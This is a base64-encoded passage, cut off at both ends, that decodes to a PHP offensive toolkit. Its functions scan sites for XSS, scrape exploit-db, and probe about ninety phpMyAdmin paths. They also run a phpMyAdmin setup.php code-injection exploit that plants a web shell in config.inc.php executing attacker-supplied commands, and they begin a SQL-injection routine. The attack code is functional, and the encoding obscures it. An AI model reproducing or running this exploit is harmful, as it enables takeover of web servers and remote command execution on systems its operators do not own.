ibGUubG9nJywgIiIuJGxpbmsuIlxyXG4iLEZJTEVfQVBQRU5EKTsKICAgICAgICAgICB9fQogICAgICAgICAgIHByaW50ICJbK10gU2VlICd2dWxuZXJhYmxlLmxvZycgZm9yIHZ1bG5lcmFibGUgbGlzdFxuIjsKICAgICAgICAgICAgCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcHJpbnQgIlshXSBDb25uZWN0IHRvIGhvc3QgZmFpbGVkXG4iOwogICAgICAgIH0KICAgfQoKCmZ1bmN0aW9uIHhzcygkc2l0ZSA9ICcnLCAkZnVsbCA9ICcwJykgewogICAgCiAgICAgICAgaWYoJGZ1bGwgPT0gJzAnKSB7CiAgICAgICAgZndyaXRlKFNURE9VVCwgIlxuLVNJVEU6ICIpOwogICAgICAgICRzaXRlID0gdHJpbShmZ2V0cyhTVERJTikpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRzaXRlID0gJHNpdGU7CiAgICAgICAgfQogICAgICAgIAogICAgICAgICRyZXF1ZXN0ID0gcGFyc2VfdXJsKCRzaXRlKTsKICAgICAgICBwcmludCAiWy1dIFVSTCA6ICRyZXF1ZXN0W2hvc3RdXG4iOwogICAgICAgIHByaW50ICJbLV0gUGF0aDogJHJlcXVlc3RbcGF0aF1cbiI7CiAgICAgICAgcHJpbnQgIlstXSBUcnkgY29ubmVjdCB0byBob3N0XG4iOwogICAgICAgICR1cmwgPSAiIi4kcmVxdWVzdFsnc2NoZW1lJ10uIjovLyIuJHJlcXVlc3RbJ2hvc3QnXS4kcmVxdWVzdFsncGF0aCddLiIiOwogICAgICAgIGlmKGNvbl9ob3N0KCR1cmwpKQogICAgICAgIHsKICAgICAgICAgICAgcHJpbnQgIlsrXSBDb25uZWN0IHRvIGhvc3Qgc3VjY2Vzc2Z1bFxuIjsKICAgICAgICAgICAgcHJpbnQgR2V0X0luZm8oJHVybCk7CiAgICAgICAgICAgIHByaW50ICJbLV0gRmluZGluZyBsaW5rIG9uIHRoZSB3ZWJzaXRlXG4iOwogICAgICAgICAgICBwcmludCAiWytdIEZvdW5kIGxpbmsgOiAiLmNvdW50KGZpbmRfbGluaygkdXJsKSkuIlxuIjsKICAgICAgICAgICAgcHJpbnQgIlstXSBGaW5kaW5nIHZ1bG5lcmFibGUuLi5cbiI7CiAgICAgICAgICAgIGlmKGlzX2FycmF5KGZpbmRfbGluaygkdXJsKSkpCiAgICAgICAgICAgIGZvcmVhY2goZmluZF9saW5rKCR1cmwpIGFzICRsaW5rKSB7CiAgICAgICAgICAgICAgICAkZmlsZSA9IGV4cGxvZGUoIi8iLCAkcmVxdWVzdFsncGF0aCddKTsKICAgICAgICAgICAgICAgICRyZXF1ZXN0WydwYXRoJ10gPSBwcmVnX3JlcGxhY2UoIi8iLiRmaWxlW2NvdW50KCRmaWxlKS0xXS4iLyIsICIiLCAkcmVxdWVzdFsncGF0aCddKTsKICAgICAgICAgICAgICAgIGlmKCFwcmVnX21hdGNoKCIvJHJlcXVlc3RbaG9zdF0vIiwgJGxpbmspKSB7ICRsaW5rID0gImh0dHA6Ly8kcmVxdWVzdFtob3N0XS8kcmVxdWVzdFtwYXRoXSRsaW5rIjsgfQogICAgICAgICAgICAgICAgJGxpbmsgPSBwcmVnX3JlcGxhY2UoIi89KC4rKS8iLCAiPTxoMT5YU1NfSEVSRTwvaDE+IiwgJGxpbmspOwogICAgICAgICAgICAgICAgaWYocHJlZ19tYXRjaCgiLzxoMT5YU1NfSEVSRTxcL2gxPi8iLCBjb25faG9zdCgkbGluaykpKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGVjaG8gIlsrXSBYU1MgdnVsbmVyYWJsZSA6ICRsaW5rXG4iOwogICAgICAgICAgICAgICAgICAgICRzYXZlW10gPSAkbGluazsKICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgcHJpbnQgIlsrXSBEb25lXG4iOwogICAgICAgICAgIGlmKGlzX2FycmF5KCRzYXZlKSkgewogICAgICAgICAgIGZvcmVhY2goJHNhdmUgYXMgJGxpbmspIHsKICAgICAgICAgICAgICAgJHNhdmUgPSBAZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5lcmFibGUubG9nJywgIiIuJGxpbmsuIlxyXG4iLEZJTEVfQVBQRU5EKTsKICAgICAgICAgICB9fQogICAgICAgICAgIHByaW50ICJbK10gU2VlICd2dWxuZXJhYmxlLmxvZycgZm9yIHZ1bG5lcmFibGUgbGlzdFxuIjsKICAgICAgICAgICAgCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcHJpbnQgIlshXSBDb25uZWN0IHRvIGhvc3QgZmFpbGVkXG4iOwogICAgICAgIH0KICAgfQoKLyoKICogRXhwbG9pdCBmdW5jdGlvbgogKiB1cGdyYWRlZCBieSBkMGxwaDFuOTggMjIgTm92IDIwMTQKICogYmFzZWQgb24gdHdlZXR5Y29hc3RlciBtaWx3MHJtIGV4cGxvaXQgZnVuY3Rpb24KICovCmZ1bmN0aW9uIGV4cGxvaXQoKSB7CiAgZndyaXRlKFNURE9VVCwgIi1EZXNjcmlwdGlvbjogIik7CiAgJGRlc2MgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgZndyaXRlKFNURE9VVCwgIi1GcmVlIFRleHQgU2VhcmNoOiAiKTsKICAkZnJlZSA9IHRyaW0oZmdldHMoU1RESU4pKTsKICBmd3JpdGUoU1RET1VULCAiLUF1dGhvcjogIik7CiAgJGF1dGhvciA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAkdXJsID0gImh0dHA6Ly93d3cuZXhwbG9pdC1kYi5jb20vc2VhcmNoLz9hY3Rpb249c2VhcmNoJmZpbHRlcl9wYWdlPTEmZmlsdGVyX2Rlc2NyaXB0aW9uPSRkZXNjJmZpbHRlcl9leHBsb2l0X3RleHQ9JGZyZWUmZmlsdGVyX2F1dGhvcj0kYXV0aG9yIjsKICBwcmludCAiWy1dIENvbm5lY3RpbmcgLi4uXG4iOwoKICAkY2ggPSBjdXJsX2luaXQoKTsKICAkdGltZW91dCA9IDEwOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwogIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULCAkdGltZW91dCk7CiAgJGh0bWwgPSBjdXJsX2V4ZWMoJGNoKTsKICBjdXJsX2Nsb3NlKCRjaCk7CgogICRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKICBAJGRvbS0

+bG9hZEhUTUwoJGh0bWwpOwoKICBmb3JlYWNoKCRkb20tPmdldEVsZW1lbnRzQnlUYWdOYW1lKCd0ZCcpIGFzICR0YWJsZSkKICB7CiAgICBpZigkdGFibGUtPmdldEF0dHJpYnV0ZSgnY2xhc3MnKSA9PSAnbGlzdF9leHBsb3RfZGF0ZScpCiAgICB7CiAgICAgICRhdHRyaWJ1dGVzID0gJHRhYmxlLT5hdHRyaWJ1dGVzOwogICAgICAkZGF0ZSA9ICR0YWJsZS0+bm9kZVZhbHVlOwogICAgICBwcmludCAiXG4iOwogICAgICBwcmludCAiWytdIEV4cGxvaXQgRGF0ZSA9ICRkYXRlIjsKICAgICAgJHNhdmUgPSBmaWxlX3B1dF9jb250ZW50cygnZXhwbG9pdHMubG9nJywgIlsrXUV4cGxvaXQgRGF0ZSA6ICRkYXRlIFxyXG4iLEZJTEVfQVBQRU5EKTsKICAgIH0KICAgIGlmKCR0YWJsZS0+Z2V0QXR0cmlidXRlKCdjbGFzcycpID09ICdsaXN0X2V4cGxvdF9kbGluaycpCiAgICB7CiAgICAgIGZvcmVhY2goJHRhYmxlLT5nZXRFbGVtZW50c0J5VGFnTmFtZSgnYScpIGFzICRsaW5rKQogICAgICB7CgkkZGxpbmsgPSAkbGluay0+Z2V0QXR0cmlidXRlKCdocmVmJyk7CglwcmludCAiXG4iOwoJcHJpbnQgIlsrXSBFeHBsb2l0IFVSTCAgPSAkZGxpbmsiOwoJJHNhdmUgPSBmaWxlX3B1dF9jb250ZW50cygnZXhwbG9pdHMubG9nJywgIlsrXUV4cGxvaXQgVVJMICA9ICIuJGRsaW5rLiJcclxuIixGSUxFX0FQUEVORCk7CiAgICAgIH0KICAgIH0KICAgIGlmKCR0YWJsZS0+Z2V0QXR0cmlidXRlKCdjbGFzcycpID09ICdsaXN0X2V4cGxvdF9kZXNjcmlwdGlvbicpCiAgICB7CiAgICAgIGZvcmVhY2goJHRhYmxlLT5nZXRFbGVtZW50c0J5VGFnTmFtZSgnYScpIGFzICRsaW5rKQogICAgICB7CgkkZGVzYyA9ICgkbGluay0+Z2V0QXR0cmlidXRlKCdocmVmJykgLiAiXHQiIC4gJGxpbmstPm5vZGVWYWx1ZSAuICJcbiIpOwoJJGF0dHJpYnV0ZXMgPSAkbGluay0+YXR0cmlidXRlczsKCSRkZXNjID0gJGxpbmstPm5vZGVWYWx1ZTsKCXByaW50ICJcbiI7CglwcmludCAiWytdIEV4cGxvaXQgTmFtZSA9ICRkZXNjIFxuIjsKCSRzYXZlID0gZmlsZV9wdXRfY29udGVudHMoJ2V4cGxvaXRzLmxvZycsICJbK11FeHBsb2l0IE5hbWUgPSAiLiRkZXNjLiJcclxuIixGSUxFX0FQUEVORCk7Cgkkc2F2ZSA9IGZpbGVfcHV0X2NvbnRlbnRzKCdleHBsb2l0cy5sb2cnLCAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBcclxuIixGSUxFX0FQUEVORCk7CiAgICAgIH0KICAgIH0KICB9CiAgCiAgcHJpbnQgIlxuXG4iOwogIHByaW50ICJbK10gRG9uZSAhXG5cbiI7CiAgcHJpbnQgIlsrXSBTZWUgJ2V4cGxvaXRzLmxvZycgZm9yIGRldGFpbHMgbGlzdFxuIjsKfQoKZnVuY3Rpb24gcG1hcHduKCRzaXRlID0gJycsICRmdWxsID0gJzAnKSB7CiRsaXN0ID0gYXJyYXkoCicvcGhwbXlhZG1pbi8nLAonL3BocE15QWRtaW4vJywgCicvUE1BLycsCicvcG1hLycsIAonL2FkbWluLycsIAonL2RiYWRtaW4vJywgCicvbXlzcWwvJywgCicvbXlhZG1pbi8nLCAKJy9waHBteWFkbWluMi8nLCAKJy9waHBNeUFkbWluMi8nLCAKJy9waHBNeUFkbWluLTIvJywgCicvcGhwLW15LWFkbWluLycsIAonL3BocE15QWRtaW4tMi4yLjMvJywgCicvcGhwTXlBZG1pbi0yLjIuNi8nLCAKJy9waHBNeUFkbWluLTIuNS4xLycsIAonL3BocE15QWRtaW4tMi41LjQvJywgCicvcGhwTXlBZG1pbi0yLjUuNS1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjUuNS1yYzIvJywgCicvcGhwTXlBZG1pbi0yLjUuNS8nLCAKJy9waHBNeUFkbWluLTIuNS41LXBsMS8nLCAKJy9waHBNeUFkbWluLTIuNS42LXJjMS8nLCAKJy9waHBNeUFkbWluLTIuNS42LXJjMi8nLCAKJy9waHBNeUFkbWluLTIuNS42LycsIAonL3BocE15QWRtaW4tMi41LjcvJywgCicvcGhwTXlBZG1pbi0yLjUuNy1wbDEvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1hbHBoYS8nLCAKJy9waHBNeUFkbWluLTIuNi4wLWFscGhhMi8nLCAKJy9waHBNeUFkbWluLTIuNi4wLWJldGExLycsIAonL3BocE15QWRtaW4tMi42LjAtYmV0YTIvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1yYzIvJywgCicvcGhwTXlBZG1pbi0yLjYuMC1yYzMvJywgCicvcGhwTXlBZG1pbi0yLjYuMC8nLCAKJy9waHBNeUFkbWluLTIuNi4wLXBsMS8nLCAKJy9waHBNeUFkbWluLTIuNi4wLXBsMi8nLCAKJy9waHBNeUFkbWluLTIuNi4wLXBsMy8nLCAKJy9waHBNeUFkbWluLTIuNi4xLXJjMS8nLCAKJy9waHBNeUFkbWluLTIuNi4xLXJjMi8nLCAKJy9waHBNeUFkbWluLTIuNi4xLycsIAonL3BocE15QWRtaW4tMi42LjEtcGwxLycsIAonL3BocE15QWRtaW4tMi42LjEtcGwyLycsIAonL3BocE15QWRtaW4tMi42LjEtcGwzLycsIAonL3BocE15QWRtaW4tMi42LjItcmMxLycsIAonL3BocE15QWRtaW4tMi42LjItYmV0YTEvJywgCicvcGhwTXlBZG1pbi0yLjYuMi1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjYuMi8nLCAKJy9waHBNeUFkbWluLTIuNi4yLXBsMS8nLCAKJy9waHBNeUFkbWluLTIuNi4zLycsIAonL3BocE15QWRtaW4tMi42LjMtcmMxLycsIAonL3BocE15QWRtaW4tMi42LjMvJywgCicvcGhwTXlBZG1pbi0yLjYuMy1wbDEvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1yYzEvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDEvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDIvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDMvJywgCicvcGhwTXlBZG1pbi0yLjYuNC1wbDQvJywgCicvcGhwTXlBZG1pbi0yLjYuNC8nLCAKJy9waHBNeUFkbWluLTIuNy4wLWJldGExLycsIAonL3BocE15QWRtaW4tMi43LjAtcmMxLycsIAonL3BocE15QWRtaW4tMi43LjAtcGwxLycsIAonL3BocE15QWRtaW4tMi43LjAtcGwyLycsIAonL3BocE15QWRtaW4tMi43LjAvJywgCicvcGhwTXlBZG1pbi0yLjguMC1iZXRhMS8nLCAKJy9waHBNeUFkbWluLTIuOC4wLXJjMS8nLCAKJy9waHBNeUFkbWluLTIuOC4wLXJjMi8nLCAKJy9waHBNeUFkbWluLTIuOC4wLycsIAonL3BocE15QWRtaW4tMi44LjAuMS8nLCAKJy9waHBNeUFkbWluLTIuOC4wLjIvJywgCicvcGhwTXlBZG1pbi0yLjguMC4zLycsIAonL3BocE15QWRtaW4tMi44LjAuNC8nLCAKJy9waHBNeUFkbWluLTIuOC4xLXJjMS8nLCAKJy9waHBNeUFkbWluLTIuOC4xLycsIAonL3BocE15QWRtaW4tMi44LjIvJywgCicvc3FsbWFuYWdlci8nLCAKJy9teXNxbG1hbmFnZXIvJywgCicvcC9tL2EvJywgCicvUE1BMjAwNS8nLCAKJy9wbWEyMDA1LycsIAonL3BocG1hbmFnZXIvJywgCicvcGhwLW15YWRtaW4vJywgCicvcGhwbXktYWRtaW4vJywgCicvd2ViYWRtaW4vJywgCicvc3Fsd2ViLycsIAonL3dlYnNxbC8nLCAKJy93ZWJkYi8nLCAKJy9teXNxbGFkbWluLycsIAonL215c3FsLWFkbWluLycsCik7CgogICAgICAgIGlmKCRmdWxsID09ICcwJykgewogICAgICAgIGZ3cml0ZShTVERPVVQsICJcbi1TSVRFOiAiKTsKICAgICAgICAkc2l0ZSA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc2l0ZSA9ICRzaXRlOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBwcmludCAiXG5bIV0gcG1hUFdOISAtIHBocE15QWRtaW4gQ29kZSBJbmplY3Rpb24gRXhwbG9pdChQSFApIGJ5IGQzY2s0XG5cbiI7CiAgICAgICAgcHJpbnQgIlstXSBTaXRlIDogIi4kc2l0ZS4iXG4iOwogICAgICAgIHByaW50ICJbLV0gU2Nhbm5pbmcgcGhwTXlBZG1pbiwgd2FpdCBzZWMuLlxuIjsKICAgICAgICBmb3JlYWNoKCRsaXN0IGFzICRwYXRoKSB7CiAgICAgICAgcGhwbXlhZG1pbl9zY2FuX3NpdGUoJHNpdGUuJHBhdGgpOwogIH0KfQoKZnVuY3Rpb24gcGhwbXlhZG1pbl9zY2FuX3NpdGUoJHVybCkgewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgIC8vcHJpbnQgJHVybDsKICAgIGlmIChwcmVnX21hdGNoKCIvMjAwIE9LLyIsICRyZXN1bHQpIGFuZCBwcmVnX21hdGNoKCIvcGhwTXlBZG1pbi8iLCAkcmVzdWx0KSkgewogICAgICAgIHByaW50ICJcblshXSB3MDB0ISB3MDB0ISBGb3VuZCBwaHBNeUFkbWluIFsgIi4kdXJsLiIgXSI7CiAgICAgICAgcHJpbnQgIlxuWy1dIFNjYW5uaW5nIHZ1bG5lcmFibGUsIHdhaXQgc2VjLi5cbiI7CiAgICAgICAgcGhwbXlhZG1pbl9leHBsb2l0X3NpdGUoJHVybCk7CiAgICB9Cn0KCmZ1bmN0aW9uIHBocG15YWRtaW5fZXhwbG9pdF9zaXRlKCR1cmwpIHsKICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9IRUFERVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybC4ic2NyaXB0cy9zZXR1cC5waHAiKTsKICAgICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgICRjaDIgPSBjdXJsX2luaXQoKTsKICAgIGN1cmxfc2V0b3B0KCRjaDIsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoMiwgQ1VSTE9QVF9IRUFERVIsIDEpOwogICAgY3VybF9zZXRvcHQoJGNoMiwgQ1VSTE9QVF9VUkwsICR1cmwuImNvbmZpZy9jb25maWcuaW5jLnBocCIpOwogICAgJHJlc3VsdDIgPSBjdXJsX2V4ZWMoJGNoMik7CiAgICBjdXJsX2Nsb3NlKCRjaDIpOwogICAgLy9wcmludCAkdXJsOwogICAgaWYgKHByZWdfbWF0Y2goIi8yMDAgT0svIiwgJHJlc3VsdCkgYW5kIHByZWdfbWF0Y2goIi90b2tlbi8iLCAkcmVzdWx0KSBhbmQgcHJlZ19tYXRjaCgiLzIwMCBPSy8iLCAkcmVzdWx0MikpIHsKICAgICAgICBwcmludCAiXG5bIV0gdzAwdCEgdzAwdCEgRm91bmQgcG9zc2libGUgcGhwTXlBZG1pbiB2dWxuIjsKICAgICAgICBwcmludCAiXG5bLV0gRXhwbG9pdGluZywgd2FpdCBzZWMuLlxuIjsKICAgICAgICBwaHBteWFkbWluX2V4cGxvaXQoJHVybCk7CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBwcmludCAiXG5bLV0gU2hpdCEgbm8gbHVjay4uIG5vdCB2dWxuZXJhYmxlXG4iOwogICAgfQp9CgpmdW5jdGlvbiBwaHBteWFkbWluX2V4cGxvaXQoJHcwMHQpIHsKICAgICAgICAkdXNlcmFnZW50ID0gIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVM7IHJ2OjEuOC4xLjIwKSBHZWNrby8yMDA4MTIxNyBGaXJlZm94LzIuMC4wLjIwICguTkVUIENMUiAzLjUuMzA3MjkpICI7IC8vZmlyZWZveCAKICAgICAgICAvL2ZpcnN0IGdldCBjb29raWUgKyB0b2tlbiAKICAgICAgICAkY3VybCA9IGN1cmxfaW5pdCgpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICR3MDB0LiJzY3JpcHRzL3NldHVwLnBocCIpOyAvL1VSTCAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCxDVVJMT1BUX0NPTk5FQ1RUSU1FT1VULDIwKTsKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1NTTF9WRVJJRllIT1NULCBmYWxzZSk7ICAgICAgICAgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyAvL3JldHVybiBzaXRlIGFzIHN0cmluZyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAiZXhwb2l0Y29va2llLnR4dCIpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9DT09LSUVKQVIsICJleHBsb2l0Y29va2llLnR4dCIpOyAKICAgICAgICAkcmVzdWx0ID0gY3VybF9leGVjKCRjdXJsKTsKICAgICAgICBjdXJsX2Nsb3NlKCRjdXJsKTsKICAgICAgICBpZiAocHJlZ19tYXRjaF9hbGwoIi90b2tlblwiXHMrdmFsdWU9XCIoW14+XSs/KVwiLyIsICRyZXN1bHQsICRtYXRjaGVzKSk7CiAgICAgICAgCiAgICAgICAgJHRva2VuID0gJG1hdGNoZXNbMV1bMV07CiAgICAgICAgaWYgKCR0b2tlbiAhPSAnJykgewogICAgICAgIHByaW50ICJcblshXSB3MDB0ISB3MDB0ISBHb3QgdG9rZW4gPSAiIC4gJG1hdGNoZXNbMV1bMV07CiAgICAgICAgJHBheWxvYWQgPSAidG9rZW49Ii4kdG9rZW4uIiZhY3Rpb249c2F2ZSZjb25maWd1cmF0aW9uPWE6MTp7czo3OiUyMlNlcnZlcnMlMjIlM2JhOjE6e2k6MCUzYmE6Njp7czoxMzY6JTIyaG9zdCUyNyU1ZD0lMjclMjclM2IlMjBpZihcJF9HRVQlNWIlMjdjJTI3JTVkKXtlY2hvJTIwJTI3JTNjcHJlJTNlJTI3JTNic3lzdGVtKFwkX0dFVCU1YiUyN2MlMjclNWQpJTNiZWNobyUyMCUyNyUzYy9wcmUlM2UlMjclM2J9aWYoXCRfR0VUJTViJTI3cCUyNyU1ZCl7ZWNobyUyMCUyNyUzY3ByZSUzZSUyNyUzYmV2YWwoXCRfR0VUJTViJTI3cCUyNyU1ZCklM2JlY2hvJTIwJTI3JTNjL3ByZSUzZSUyNyUzYn0lM2IvLyUyMiUzYnM6OTolMjJsb2NhbGhvc3QlMjIlM2JzOjk6JTIyZXh0ZW5zaW9uJTIyJTNiczo2OiUyMm15c3FsaSUyMiUzYnM6MTI6JTIyY29ubmVjdF90eXBlJTIyJTNiczozOiUyMnRjcCUyMiUzYnM6ODolMjJjb21wcmVzcyUyMiUzYmI6MCUzYnM6OTolMjJhdXRoX3R5cGUlMjIlM2JzOjY6JTIyY29uZmlnJTIyJTNiczo0OiUyMnVzZXIlMjIlM2JzOjQ6JTIycm9vdCUyMiUzYn19fSZlb2x0eXBlPXVuaXgiOwogICAgICAgIHByaW50ICJcblstXSBTZW5kaW5nIGV2aWwgcGF5bG9hZCBtd2FoYWhhLi4gXG4iOwogICAgICAgICRjdXJsID0gY3VybF9pbml0KCk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VSTCwgJHcwMHQuInNjcmlwdHMvc2V0dXAucGhwIik7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLENVUkxPUFRfQ09OTkVDVFRJTUVPVVQsMjApOwogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFRkVSRVIsICR3MDB0KTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUE9TVCwgdHJ1ZSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1BPU1RGSUVMRFMsICRwYXlsb2FkKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfQ09PS0lFRklMRSwgImV4cG9pdGNvb2tpZS50eHQiKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfQ09PS0lFSkFSLCAiZXhwbG9pdGNvb2tpZS50eHQiKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIDMpOyAKICAgICAgICBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7IAogICAgICAgIGN1cmxfc2V0b3B0KCRjdXJsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgCiAgICAgICAgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIEZBTFNFKTsgCiAgICAgICAgJHJlc3VsdCA9IGN1cmxfZXhlYygkY3VybCk7CiAgICAgICAgY3VybF9jbG9zZSgkY3VybCk7CiAgICAgICAgCiAgICAgICAgcHJpbnQgIlxuWyFdIHcwMHQhIHcwMHQhIFlvdSBzaG91bGQgbm93IGhhdmUgc2hlbGwgaGVyZSI7CiAgICAgICAgcHJpbnQgIlxuWytdICIuJHcwMHQuImNvbmZpZy9jb25maWcuaW5jLnBocD9jPWlkIFxuIjsKICAgICAgICAkc2F2ZSA9IEBmaWxlX3B1dF9jb250ZW50cygncG1hc2hlbGwudHh0JywgJHcwMHQuImNvbmZpZy9jb25maWcuaW5jLnBocD9jPWlkXHJcbiIsRklMRV9BUFBFTkQpOwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgcHJpbnQgIlxuWyFdIFNoaXQhIG5vIGx1Y2suLiBub3QgdnVsbmVyYWJsZVxuIjsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBwcmludCAiU2VlICdwbWFzaGVsbC50eHQnIGZvciB0aGUgbGlzdFxuIjsKICAgICAgICBpZiAoZmlsZV9leGlzdHMoJ2V4cGxvaXRjb29raWUudHh0JykpIHsgdW5saW5rKCdleHBsb2l0Y29va2llLnR4dCcpOyB9CiAgICB9CgoKCmZ1bmN0aW9uIGluamVjdG9yKCkgewogICAgICAgIAogICAgICAgIGZ3cml0ZShTVERPVVQsICJcbi1VUkw6ICIpOwogICAgICAgICR1cmwgPSB0cmltKGZnZXRzKFNURElOKSk7CiAgICAgICAgZndyaXRlKFNURE9VVCwgIlxuLVVSTCBFbmRpbmcgKC0tIG9yIC8qKTogIik7CiAgICAgICAgJGVuZCA9IHRyaW0oZmdldHMoU1RESU4pKTsKICAgICAgICBpZighcHJlZ19tYXRjaCgiL2RhcmtjMGRlLyIsICR1cmwpKSB7CiAgICAgICAgICAgIHByaW50ICJbLV0gUGxlYXNlIGluc2VydCAnZGFya2MwZGUnIHRva2VuIG9uIHRoZSBVUkxcbiI7CiAgICAgICAgICAgIHByaW50ICJbLV0gRXhhbXBsZTogaHR0cDovL3NpdGUuY29tL25ld3MucGhwP2lkPWRhcmtjMGRlXG4iOwogICAgICAgICAgICBwcmludCAiWy1dIEV4YW1wbGU6IGh0dHA6Ly9zaXRlLmNvbS9pbmRleC5waHA

/aWQ9ZGFya2MwZGUmcGc9bmV3c1xuIjsKICAgICAgICB9IGVsc2UgewogICAgICAgIAogICAgICAgIHN3aXRjaCgkZW5kKSB7CiAgICAgICAgICAgIGNhc2UgJy0tJyA6CiAgICAgICAgICAgICRlbmQgPSAnLS0nOwogICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnLyonIDoKICAgICAgICAgICAgJGVuZCA9ICcvKic7CiAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAkZW5kID0gJy0tJzsKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIHByaW50ICJbLV0gVVJMIDogJHVybFxuIjsKICAgICAgICBwcmludCAiWyVdIFRyeWluZyBjb25uZWN0IHRvIGhvc3QuLi5cbiI7CiAgICAgICAgaWYoY29uX2hvc3QoJHVybCkpCiAgICAgICAgewogICAgICAgICAgICBwcmludCAiWytdIENvbm5lY3QgdG8gaG9zdCBzdWNjZXNzZnVsXG4iOwogICAgICAgICAgICBwcmludCBHZXRfSW5mbygkdXJsKTsKICAgICAgICAgICAgcHJpbnQgIlstXSBGaW5kaW5nIGNvbHVtbiBudW1iZXIuLi5cbiI7CiAgICAgICAgICAgIGluamVjdF9nZXRfY29sdW1uX251bSgkdXJsLCAkZW5kKTsKICAgICAgICAgICAgCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcHJpbnQgIlshXSBDb25uZWN0IHRvIGhvc3QgZmFpbGVkXG4iOwogICAgICAgIH19Cn0KCgpmdW5jdGlvbiBpbmplY3RfZ2V0X2NvbHVtbl9udW0oJHVybCwgJGVuZGluZykgewoKICAgICRtYXggPSAxMDA7CiAgICAkc3RvcCA9IDA7CiAgICAKI